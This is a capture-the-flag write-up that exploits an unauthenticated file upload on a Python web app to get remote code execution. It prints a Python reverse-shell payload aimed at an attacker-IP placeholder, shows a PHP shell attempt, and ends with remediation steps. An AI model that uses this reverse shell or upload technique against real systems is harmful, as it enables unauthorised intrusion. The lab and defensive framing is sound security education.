# Speed Chatting

**Category:** Web Exploitation  
**Vulnerability:** Unrestricted File Upload → Remote Code Execution  
**Difficulty:** Easy

---

## TL;DR

A web application running on Python (Flask/similar) exposes an unauthenticated file upload endpoint. The `/uploads` directory is directly accessible and the server fetches uploaded files automatically. By uploading a Python reverse shell, we achieve Remote Code Execution (RCE) and retrieve the flag.

---

## Reconnaissance
![IMG 1](/challenges/screenshots/speed_chatting/image.png)
### Port Scan

Nmap scan :
![IMG 2](/challenges/screenshots/speed_chatting/image(1).png)


**Open ports:**
- `22` — SSH
- `5000` — HTTP (Python web app)

### Directory Fuzzing

ffuf :
![IMG 2](/challenges/screenshots/speed_chatting/image(2).png)

No significant directories discovered beyond what was already visible. The attack surface is small — the file upload functionality is the primary point of interest.

### Web Application Fingerprinting

Inspecting HTTP response headers reveals the server stack:

```
Server: Werkzeug/3.1.5 Python/3.10.12
```

![IMG 3](/challenges/screenshots/speed_chatting/image(11).png)


> **Key takeaway:** The backend is Python, not PHP. This is critical for choosing the right payload later.

---

## Exploitation

### Step 1 — Confirming Upload & Storage Behaviour

Uploading a benign `.png` file and intercepting the response (Burp Suite or browser DevTools) reveals:

- The upload succeeds.
![IMG 4](/challenges/screenshots/speed_chatting/image(5).png)

- The response body contains the full path to the stored file (e.g., `/uploads/<randomised_filename>.png`).
![IMG 5](/challenges/screenshots/speed_chatting/image(4).png)

- The `/uploads/` directory is **publicly accessible**.

Since the filename is returned in the response, we always know the exact path of anything we upload — no need to brute-force filenames.

### Step 2 — Testing PHP Upload (Failed Attempt)

Uploading a PHP reverse shell (PentestMonkey) succeeds at the server level — no upload filter blocks `.php` files. However, navigating to the file causes the browser to **download** it rather than execute it.
![IMG 6](/challenges/screenshots/speed_chatting/image(6).png)


This confirms that PHP execution is disabled in the uploads directory — consistent with a Python backend serving static files from that path.
![IMG 7](/challenges/screenshots/speed_chatting/image(7).png)


### Step 3 — Python Reverse Shell

Since the server runs Python, we craft a Python reverse shell payload. I found the following payload here : https://0xss0rz.github.io/2020-05-10-Oneliner-shells/

```python
import socket,subprocess,os
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(("<ATTACKER_IP>",<PORT>))
os.dup2(s.fileno(),0)
os.dup2(s.fileno(),1)
os.dup2(s.fileno(),2)
subprocess.call(["/bin/sh","-i"])
```

Save this as `shell.py` (replace `<ATTACKER_IP>` and `<PORT>` with your values).

### Step 4 — Start Listener & Upload

![IMG 8](/challenges/screenshots/speed_chatting/image(8).png)


Upload `shell.py` via the web interface. I noticed that the server fecthes the file automaticaly, so the script should execute by itself and connects back to our listener. If not, just send a GET request to /uploads/<randomised_filename>.py that you can find in the server response (STEP 1).

### Step 5 — Flag

Finally, simple enumeration commands like id, ls and cat are enough to get the flag.

![IMG 9](/challenges/screenshots/speed_chatting/image(9).png)


---

## Lessons Learned

Missing the `Server` header during the initial recon phase led to an unnecessary failed attempt with a PHP shell. **Identifying the framework and server stack should always be part of the first recon step** — it directly informs payload selection and saves time.

---

## Remediation

The following measures would prevent or significantly hinder this attack:

**1. Restrict allowed file types (allowlist, not blocklist)**  
Only permit explicitly safe extensions (e.g., `.jpg`, `.png`, `.gif`). Reject anything else server-side. Do not rely on client-side checks.

**2. Rename and strip uploaded files**  
Rename files to random UUIDs with a forced safe extension. Strip all metadata. Never preserve the original filename or extension.

**3. Serve uploads from an isolated, non-executable context**  
Store uploaded files outside the web root or in a dedicated storage bucket (e.g., S3). Serve them through a proxy that enforces `Content-Disposition: attachment` to prevent in-browser execution.

**4. Disable directory execution**  
If using a traditional web server, explicitly disable script execution in the uploads directory (e.g., `php_flag engine off` in `.htaccess`, or equivalent Nginx config).

**5. Validate file content, not just extension**  
Use magic byte / MIME type inspection server-side to verify the file's actual content matches the expected type.

**6. Do not expose upload paths in API responses**  
Returning the full storage path in the response is unnecessary and provides an attacker with a direct link to their payload. Return an opaque reference ID instead.

**7. Implement authentication on upload endpoints**  
If the upload feature is meant for authenticated users only, enforce session/token validation before accepting any file.
